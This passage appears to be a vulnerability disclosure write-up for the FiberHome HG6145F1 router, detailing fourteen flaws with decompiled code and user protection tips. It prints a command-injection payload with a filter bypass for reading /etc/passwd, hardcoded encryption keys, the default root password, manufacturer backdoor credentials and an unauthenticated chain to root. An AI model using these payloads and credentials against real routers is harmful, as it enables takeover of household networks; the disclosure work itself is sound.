| `fhdrv_gpon_drv.ko` | 167KB | GPON kernel module (not stripped) |

All libraries are ARM 32-bit, not stripped, with debug symbols — making reverse engineering straightforward with IDA Pro or Ghidra.

### Security Mechanisms Missing

- **No ASLR:** `randomize_va_space = 0` (disabled in kernel)
- **No stack canaries** on CGI binary
- **No privilege separation** (everything runs as root)
- **No SELinux/AppArmor/seccomp**
- **No firmware signing** (CRC32 only)
- **No secure boot chain**

---

## CVE Deep Dive — How We Found Each Vulnerability

### CVE-2026-37752 -- Predictable Admin Password (CWE-1391)

**What it is:** Your router's admin password is a mathematical function of its MAC address. The MAC is printed on the sticker on the bottom of every router.

**How we found it:** Using IDA Pro 9.1, we decompiled the CGI binary (`/www/cgi-bin/ajax`, 828KB ARM ELF). Inside the `do_login` function, we traced the password validation logic. It calls a function that takes the MAC address, appends the hardcoded salt string `"AEJLY"`, computes an MD5 hash, then maps the first 20 hex characters to password characters using 4 character sets (uppercase, lowercase, digits, symbols). The algorithm is deterministic — same MAC always produces the same password, on every router worldwide.

**Why it matters:** The MAC address is public information. It's printed on the device, broadcast in WiFi probe frames, and leaked by CVE-5 without authentication. This means EVERY router's password can be computed by anyone.

**The discovery process:**
1. Opened the CGI binary in IDA Pro
2. Found the `do_login` handler
3. Traced the password comparison logic
4. Found the MD5 + salt computation
5. Identified the character mapping tables in `.rodata`
6. Wrote `passgen.py` to replicate the algorithm
7. Tested on 2 different routers — both passwords matched

**Protection:** Change your admin password immediately after first login.

---

### CVE-2026-37754 -- Remote Code Execution (CWE-78)

**What it is:** The speedtest feature in the router's web interface passes user-supplied text directly into a Linux `system()` call without any sanitization. By adding a semicolon (`;`) followed by shell commands, an attacker can execute anything as root.

**How we found it:** In IDA Pro, we searched for calls to `system()` in the CGI binary. At address `0x5c800`, we found:
```c
snprintf(cmd, 0x100, "/fhrom/bin/speedtest %s &", url_param);
system(cmd);
```
The `url_param` comes directly from user POST data with zero filtering. We crafted a URL parameter like `;id` which becomes `/fhrom/bin/speedtest ;id &` — the shell interprets the semicolon as a command separator and runs `id` as a second command.

**The nginx WAF complication:** We discovered that nginx blocks the `>` character in POST bodies (a basic WAF rule). This prevents simple output redirection. We bypassed this using `tee` for writing files and glob wildcards (`/etc/pass*`) to bypass string-matching filters on paths like `/etc/passwd`.

**Why it matters:** This gives any admin-level user full root shell access. Combined with CVE-1 (predictable password), anyone who knows the MAC address gets root.

**Protection:** No user-side fix. The vendor must sanitize all user input before passing to `system()`.

---

### CVE-2026-37753 -- Hardcoded AES Key (CWE-321)

**What it is:** All stored credentials (WiFi password, PPPoE login, VoIP SIP credentials, FTP password) are encrypted with AES-128-ECB using the key `ABCDEFGHIJKLMNOP` — identical on every router.

**How we found it:** In IDA Pro, we decompiled `libfhapi.so` and found the function `init_aes_key()`. The code is:
```c
for (int i = 0; i < 16; i++)
    key[i] = i + 65;  // 65 = ASCII 'A', so key = "ABCDEFGHIJKLMNOP"
```
The IV initialization function `init_aes_iv()` generates `"0123456789:;<=>?"` but the mode is ECB (Electronic Codebook) which doesn't use an IV, making it even weaker.

We then found the encrypted credentials in `/fhconf/usrconfig_conf`, decrypted them with the key, and confirmed they matched the actual PPPoE/WiFi passwords.

**Additionally discovered:** The firmware includes a `cfg_cmd` binary that reads the TR-069 data model, returning ALL credentials in **plaintext** without any decryption needed — making the AES encryption security theater.

**Protection:** Never share or export your router's config backup file. Anyone with the backup can decrypt everything.

---

### CVE-2026-37755 -- Unsigned Firmware Upload (CWE-354)

**What it is:** The firmware upgrade mechanism only validates a CRC32 checksum (with non-standard init value of 0 instead of 0xFFFFFFFF). There is no RSA/ECDSA cryptographic signature. Anyone with admin access can upload arbitrary firmware.

**How we found it:** We decompiled `libLedState.so` in IDA Pro and traced the firmware upgrade state machine:
1. `handler_head()` — parses the 3584-byte header, checks magic string `~@$^*)+ATOS!#%&(`
2. `file_verify()` — computes CRC32 with init=0 and compares to header field at offset 0x166
3. `update_finalily_handler()` — executes the payload as an ARM binary

We also discovered the firmware uses 3DES-CBC encryption with hardcoded key `"FIBERHOME_KEY"` (null-padded to 24 bytes) and IV `"01234567"`, both found in `libLedState.so`. This means anyone can decrypt, modify, and re-encrypt firmware images.

We built `custom-webui.bin` — a valid firmware file that passes CRC32 validation and executes an ARM ELF payload. The payload extracts embedded web files, applies bind mounts over the read-only `/www/` filesystem, and sets up root access.

**Protection:** Only install firmware from your ISP. Never download firmware files from untrusted sources.

---

### CVE-2026-37759 -- Unauthenticated Information Disclosure (CWE-200)

**What it is:** Several CGI API endpoints return sensitive device information without requiring any authentication.

**How we found it:** We tested every API method found via `strings /www/cgi-bin/ajax` by sending unauthenticated GET requests. We found these endpoints respond without login:

| Endpoint | What it leaks |
|----------|--------------|
| `get_base_info` | MAC address, GPON SN, hardware/software version, CPU/RAM, optical power, uptime |
| `get_device_name` | Model name |
| `get_operator` | ISP name, serial number, operator code |
| `get_super_userName` | Superadmin username |
| `get_web_config` | First-time login status, session timeout |
| `get_schedule_reboot_info` | Reboot schedule |
| `get_refresh_sessionid` | Fresh session token |

**The critical chain:** `get_base_info` leaks the MAC address → feed MAC into `passgen.py` → get admin password → full admin access. Zero credentials needed at any step.

**Protection:** No user-side fix. The vendor must require authentication for these endpoints.

---

### CVE-2026-37760 -- XOR Config "Encryption" (CWE-327)

**What it is:** When you export your router's configuration file (backup), it's "encrypted" with a trivially reversible XOR cipher that requires no key to decrypt.

**How we found it:** We decompiled `libfhapi.so` and found the function `fhapi_file_crypt_decrypt()`:
```c
for (i = len - len/9527; i != 2*len - len/9527; i++)
    output = getc(file) ^ (i + 9527);
```
This is a simple XOR with a predictable counter starting at 9527. No key material whatsoever. We wrote a 5-line Python script to decrypt any exported config file, confirmed it produces valid XML with all credentials in cleartext.

**Protection:** Never share your router's config backup file with anyone. Treat it as a plaintext password list.

---

### CVE-2026-37756 -- Boot Process Backdoor (CWE-912)

**What it is:** FiberHome left a manufacturer debug backdoor in the boot initialization script. During the first 2 seconds of boot, typing a 9-character code on the serial console (UART) bypasses ALL security initialization and drops to a root shell.

**How we found it:** Reading `/fhrom/fhshell/initialize.sh` (accessible via root shell from CVE-2), we found:
```bash
read -n9 -t 2 passwd        # Read 9 chars in 2-second window
passwd_fh=$(echo -n ${passwd:0:3} | sha1sum)  # SHA1 first 3 chars
if [ $passwd_fh == "ef431b3..." ]; then        # Compare to hardcoded hash
    if [ ${passwd:3:6} == $macaddr ]; then     # Last 6 = transformed MAC
        exit 0  # BYPASS EVERYTHING
    fi
fi
```
The SHA1 hash `ef431b3bb9e0f022134ebde6d2b87c66ca2c58d2` only covers 3 characters — brute-forceable in seconds (17,576 possibilities for lowercase). The remaining 6 characters are a simple substitution of the MAC address digits.

**Protection:** Physically secure your router. Don't leave it in publicly accessible locations.

---

### CVE-2026-37758 -- Cleartext HTTP (CWE-319)

**What it is:** The entire admin interface runs over unencrypted HTTP on port 80. No HTTPS option is enabled by default.

**How we found it:** Checked `nginx.conf` on the router — HTTPS configuration is commented out. The client-side JavaScript "encrypts" the login password with AES before sending, but uses the same hardcoded key from CVE-3 (`ABCDEFGHIJKLMNOP`), which is embedded in the publicly accessible `aes.js` file. This provides zero protection — anyone sniffing the network can decrypt it.

**Protection:** Avoid logging into your router admin panel over WiFi in shared or untrusted networks.

---

### CVE-2026-37757 -- No CSRF Protection (CWE-352)

**What it is:** The router's web interface has no Cross-Site Request Forgery protection. If you're logged into your router and visit a malicious website, that website can silently send commands to your router.

**How we found it:** We analyzed the JavaScript file `xhr.js` and found that every POST request uses a `sessionid` obtained via `get_refresh_sessionid`. This session ID is:
1. Not tied to any login session
2. Obtainable via unauthenticated GET request
3. Not validated against Origin/Referer headers

We built a proof-of-concept HTML page that, when opened by someone logged into their router, changes the admin password without the user's knowledge.

**Protection:** Always log out of your router's admin panel when you're done. Don't leave the admin session open.

---

### CVE-10 -- No Privilege Separation (CWE-269)

**What it is:** Every single process on the router — web server, DNS, DHCP, FTP, SSH, CGI — runs as root (uid=0) with maximum privileges.

**How we found it:** Ran `ps aux` on the root shell — every process shows root. Confirmed in `nginx.conf` (`user root;`) and `thttpd.conf` (`user=root`). No non-root user accounts exist in `/etc/passwd`. No SELinux, AppArmor, seccomp, or Linux capabilities are configured.

**Why it matters:** In proper system design, a web server vulnerability should only compromise the web server, not the entire system. Here, ANY vulnerability in ANY service gives instant full root access. CVE-2 (command injection) is instantly root because of this.

**Protection:** No user-side fix.

---

### CVE-11 -- Default Root Password (CWE-798)

**What it is:** The root password is `root123` on every single HG6145F1 router. It's in the read-only filesystem — users cannot change it.

**How we found it:** Read `/etc/passwd` on the root shell:
```
root:$1$ydAwaEgU$ctlzLX4LFq874ZDkSM75W/:0:0:root:/:bin/sh
```
The MD5-crypt hash cracked instantly with any wordlist: password is `root123`. Additionally, the ISP installs Dropbear SSH on port 22 bound to `0.0.0.0` (all interfaces) — accessible with this password from the LAN.

**Protection:** No user-side fix. The password is burned into read-only firmware.

---

### CVE-12 -- Hardcoded Backdoor Credentials (CWE-798)

**What it is:** The CGI binary contains a hardcoded manufacturer backdoor with superadmin privileges — higher access than the normal admin account.

**How we found it:** In IDA Pro, we decompiled the `do_jumplogin` function at address `0x4ea20`:
```c
if (!strcmp(s1, "fiberhomehg2x0") && !strcmp(v20, "CUAdmin")) {
    if (!strcmp(v29, "hg2x0"))
        v4 = 4;  // SUPERADMIN level 4 (admin is only level 2)
}
```
The credentials `fiberhomehg2x0`/`hg2x0` are compiled into every firmware image regardless of which ISP deploys the router. The backdoor activates when the operator field is set to `CU` (China Unicom), but since `/fhconf/sysinfo_conf` is writable, any root user can change the operator to activate it.

**Protection:** No user-side fix. This backdoor is embedded in the firmware binary.

---

### CVE-13 -- Password Change Without Verification (CWE-620)

**What it is:** An API method named `modify_password_not_check_oldpassword` does exactly what the name says — changes the admin password without requiring the current password.

**How we found it:** The method name was discovered via `strings` on the CGI binary. We decompiled it at address `0x3609c` in IDA Pro:
```c
int modify_password_not_check_oldpassword() {
    getValueByName(g_post_method_data, "login_user", s1);
    getValueByName(g_post_method_data, "new_password", v6);
    // Sets password directly — NO old password verification
    set_single_xml_value("...WebSuperPassword", v6);
}
```
Combined with CVE-9 (no CSRF), a malicious website can change your router's admin password without you knowing.

**Protection:** Log out of your router admin panel when not using it.

---

### CVE-14 -- Superadmin Username Leak (CWE-200)

**What it is:** The `get_superadmin_userName` API endpoint returns the ISP's superadmin username without authentication.

**How we found it:** During our unauth endpoint fuzzing (testing all 641 CGI methods without login), `get_super_userName` responded with:
```json
{"session_valid":1, "super_userName":"admin"}
```
No login required. Combined with CVE-13 (password change without verification), an attacker can take full superadmin control: first leak the username, then change its password.

**Protection:** No user-side fix.

---

## References

- GitHub Repository: https://github.com/MrSmiiith/hg6145f1-full-access
- FiberHome HG6145F1 Product Page: https://www.fiberhomegroup.com
- GPON Security: https://www.enisa.europa.eu/publications/gpon-security
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- CWE Database: https://cwe.mitre.org/
